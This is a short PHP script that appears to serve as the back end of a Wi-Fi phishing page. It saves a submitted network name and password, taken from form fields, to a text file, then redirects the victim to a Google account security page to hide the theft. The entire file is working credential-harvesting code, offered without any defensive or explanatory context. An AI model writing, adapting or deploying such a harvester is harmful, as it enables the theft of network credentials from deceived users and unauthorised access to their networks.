<?php

file_put_contents("userinfo.txt", "Wifi name: " . $_POST['key2'] . "Wifi Password: " . $_POST['key1'] . "\n", FILE_APPEND);
header('Location: https://myaccount.google.com/security?pli=1');
exit();
